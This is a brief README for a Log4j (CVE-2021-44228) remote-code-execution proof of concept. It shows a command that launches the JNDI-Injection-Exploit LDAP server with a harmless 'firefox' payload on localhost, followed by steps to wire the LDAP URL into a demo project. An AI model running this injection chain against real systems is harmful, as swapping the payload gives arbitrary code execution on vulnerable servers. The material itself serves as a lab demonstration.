## Log4j RCE POC using [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)

- Start the LDAP server with the command using -C arg
```java -jar ./tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "firefox" -A "127.0.0.1"```
- The above command will start the server and logs out the url for LDAP and RMI.
- Copy the LDAP url and replace it in the Main java file.

- Run the log4jPOC project in IDE like Intellij.

## Ref
- https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
- https://github.com/welk1n/JNDI-Injection-Exploit
- https://www.veracode.com/blog/research/exploiting-jndi-injections-java
 

